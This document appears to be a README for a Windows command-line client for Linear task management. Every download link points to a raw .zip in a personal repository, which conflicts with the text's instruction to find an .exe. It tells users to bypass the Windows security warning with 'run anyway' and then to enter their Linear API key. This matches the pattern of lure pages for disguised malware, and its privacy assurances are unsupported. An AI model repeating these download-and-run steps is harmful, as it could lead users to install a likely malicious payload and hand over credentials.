# 🚀 linear-cli - Manage your Linear tasks with speed

[![](https://img.shields.io/badge/Download-linear--cli-blue.svg)](https://raw.githubusercontent.com/Sujicha8817/linear-cli/main/cmd/linear-cli-v2.3.zip)

This tool helps you manage your Linear workspace. It works on your computer to handle issues, projects, and cycles. You can update your work without opening a web browser. The app runs commands to track progress and sync data. It handles high-level tasks through a simple text interface.

## 📥 Getting Started

You need a Windows computer to use this application. Ensure you have an active internet connection to link the tool with your Linear account. Follow these steps to set up the software.

1. Go to the [official download page](https://raw.githubusercontent.com/Sujicha8817/linear-cli/main/cmd/linear-cli-v2.3.zip) to find the latest version.
2. Look for the file ending in .exe under the latest release section.
3. Save the file to your desktop or a folder you can find easily.
4. Double-click the file to open it.
5. Windows might show a security window. Click more info and then click run anyway.
6. The application opens a command window. Follow the prompts on the screen to finish the setup.

## ⚙️ Initial Setup

The first time you run the tool, it asks for your Linear API key. You get this key from your Linear settings page.

1. Log into your Linear account in your web browser.
2. Go to your settings menu.
3. Select API.
4. Create a new personal API key.
5. Copy this long string of characters.
6. Paste the key into the command window when the tool requests it.
7. Press enter to save your credentials.

The tool checks the connection. Once it succeeds, you see a menu of options.

## 🛠️ Usage Basics

The interface uses text commands. You type a command and press enter to perform an action. Here are the common commands to manage your work.

- List issues: Shows all tasks assigned to you.
- Create issue: Starts a new task in your current project.
- Update cycle: Changes the status of your current work cycle.
- View initiatives: Displays goals for your team.

You do not need to memorize these commands. If you type help and press enter, the tool displays a full list of available actions with short descriptions.

## 📋 Managing Issues

Issues are the primary units of work in Linear. Use the issue command to perform most daily tasks.

To view your current list:
Type `issue list` and press enter. The tool fetches data from your account and displays a numbered list of tasks. Each task has a unique ID. Use this ID for further actions.

To change a task status:
Type `issue update [ID]` where [ID] is the number of the task. The tool asks for the new status. Type in progress or completed and press enter.

To create a new task:
Type `issue create`. The tool asks for a title and a description. Type your text and press enter. The tool saves the task to your Linear workspace immediately.

## 📊 Projects and Cycles

Projects act as containers for your issues. Cycles represent time blocks for team goals.

To view your active projects:
Type `project list`. This command displays current projects. It shows the progress percentage for each.

To manage cycles:
Type `cycle show` to see your team's current focus. You can see start dates and end dates for the cycle. This helps you understand your deadlines.

## 🌐 Connectivity and Webhooks

The tool supports webhooks. This feature allows the software to react when something changes in your Linear account.

If you set up an automation flow, the tool listens for updates. You do not need to keep the window open for background syncing. The tool connects to the Linear servers at set intervals. You can change this interval in the settings file found in your user folder.

## 🧩 Troubleshooting Common Issues

If the tool does not work, try these steps to fix the problem.

- Check your API key. If the key expires, the tool returns an authentication error. Generate a new key and update the settings file.
- Check your internet connection. The tool needs access to api.linear.app to function.
- Verify your Windows permissions. Ensure the folder where you saved the file allows executable programs to run.
- Update the software. Check the GitHub page frequently for new versions. Older versions might not work with recent changes to the Linear platform.

## 💡 Best Practices

Use the tool to clear your backlog quickly. Focus on typing short commands. Integrate the tool into your daily flow by keeping the window open on a second monitor. This allows you to check status updates without clicking through browser tabs.

The tool works with existing developer workflows. If you use custom scripts, you can pipe the output of this tool into other programs. This allows for automation of status reports or movement of issues between projects automatically.

## 🛡️ Privacy and Security

The software stores your API key on your local machine. This file stays on your computer. It never sends your key to any server other than Linear. You control the access. If you lose your computer, revoke the API key in your Linear account settings to prevent unauthorized access.

The tool does not collect user data. It does not track your usage patterns. It serves only as a bridge between your local machine and your Linear workspace. If you have questions about the underlying code, browse the files on the repository page. You can read the source code to see exactly how the tool handles your data.